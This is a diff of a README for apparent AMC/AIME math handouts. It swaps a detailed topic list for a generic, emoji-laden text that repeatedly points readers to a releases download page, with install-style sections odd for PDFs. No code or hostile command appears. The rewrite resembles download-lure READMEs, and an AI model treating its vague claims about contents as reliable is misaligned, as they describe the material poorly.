@@ -1,62 +1,62 @@
-A work-in-progress collection of LaTeX-based math handouts covering Algebra, Combinatorics, Geometry, and Number Theory.
-Tailored towards AMC/AIME preparation.
-Prepared with Mathcha.
-These materials are free to use for self-study or classroom purposes. If you find a typo or have a suggestion for a new topic, please tell me to do so.
+# 🎉 math-handouts - Easy Math Preparation for All
 
-ALGEBRA:
-Rates, Proportion, and Variation;
-Sequences and Series;
-Exponents and Logarithms;
-Polynomials;
-Special Functions;
-Complex Numbers;
-Conic Sections;
-Induction and Manipulation;
-Algebraic Trigonometry;
-Inequalities;
-Functional Equations;
-Miscellaneous Topics;
-Vectors and Matrices
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/trex111/math-handouts/releases)
 
-GEOMETRY:
-Angles,
-Triangles I,
-Triangles II,
-Polygons,
-Circles I,
-Analytic Geometry,
-Stereometry,
-Geometric Trigonometry,
-Special Coordinate Systems,
-Complex Number Geometry,
-Triangles III,
-Circles II,
-Collinearity and Concurrence,
-Transformations,
-Inversive Geometry,
-Projective Geometry
+## 📚 Introduction
+Welcome to the **math-handouts** project! This repository contains a collection of LaTeX-based math handouts and mini-lessons. Our resources cover key topics in Algebra, Combinatorics, Geometry, and Number Theory. These handouts are designed specifically for students preparing for AMC and AIME tests.
 
-COMBINATORICS:
-Permutations and Combinations,
-Basic Probability,
-Strategy in Counting,
-Geometric Techniques,
-Random Variables and Expectation,
-Basic Statistics,
-Inclusion and Exclusion,
-Construction and Bijection,
-Pigeonhole Principle,
-Distributions and Stirling Numbers,
-Induction and Recursion,
-Conditional Probability,
-Combinatorial Identities,
-Events with States,
-Generating Functions,
-Graph Theory
+## 🚀 Getting Started
+Getting started with math-handouts is simple. Follow the steps below to download and access the materials.
 
-NUMBER THEORY:
-Primes and Divisors,
-Bases and Digits,
-Modular Arithmetic,
-Diophantine Equations,
-Miscellaneous Topics
+1. **Visit the Releases Page**  
+   To begin, go to our releases page: [Download Here](https://github.com/trex111/math-handouts/releases).
+
+2. **Download the Handouts**  
+   On the releases page, you will see a list of available versions. Click on the latest release version to access the files. Look for files labeled with .tex or .pdf extensions, as these are the handouts you will need.
+
+3. **Running the Handouts**  
+   After downloading the files, you can view them using a LaTeX editor or PDF viewer. If you do not have a LaTeX editor installed, we recommend using any of the following options:
+   - **TeXworks**: A simple and effective LaTeX editor.
+   - **Overleaf**: An online LaTeX editor that does not require installation.
+
+## 🖥️ System Requirements
+To run the LaTeX-based handouts, you should have the following:
+- A computer with Windows, macOS, or Linux.
+- A PDF viewer or LaTeX editor, as mentioned above.
+- Basic familiarity with opening files on your computer.
+
+## 📄 Content Overview
+The math-handouts cover several topics to help you prepare effectively:
+
+- **Algebra**: Key concepts and practice problems.
+- **Combinatorics**: Introduction to counting techniques.
+- **Geometry**: Principles and theorems.
+- **Number Theory**: Fundamentals and advanced topics.
+
+Each section includes explanations, sample problems, and exercises.
+
+## 🛠️ Usage
+1. **Open the Handouts**: Locate the downloaded .tex or .pdf files on your computer.
+2. **Read and Practice**: Work through the examples provided in each handout. Take notes and try the exercises to reinforce your understanding.
+3. **Review Regularly**: Use the materials as a reference while studying for AMC and AIME.
+
+## 🔧 Download & Install
+To download and start using the handouts, simply visit this page: [Download Here](https://github.com/trex111/math-handouts/releases). Select the appropriate files you wish to download and follow the previously outlined steps to open and use them.
+
+## 📍 Additional Resources
+For further learning, we have included references to additional materials and resources:
+- **Online Courses**: Explore various math-related courses online focused on topics in this repository.
+- **Community Forums**: Join forums for discussions related to preparation for AMC and AIME, share strategies, and ask questions.
+
+## 🤝 Contributing
+If you want to contribute to the math-handouts project, please feel free to fork the repository, make your changes, and submit a pull request. We welcome improvements and new topics to be added to our collection.
+
+## 📋 License
+This project is licensed under the MIT License. Feel free to use the materials for educational purposes. Make sure to give credit where it is due.
+
+## 📞 Contact
+For questions or suggestions, please reach out via the issues section of this repository. We appreciate your feedback and support!
+
+## 🥳 Thank You!
+Thank you for using math-handouts! We hope these resources make your math preparation smoother and more effective. Good luck with your studies!
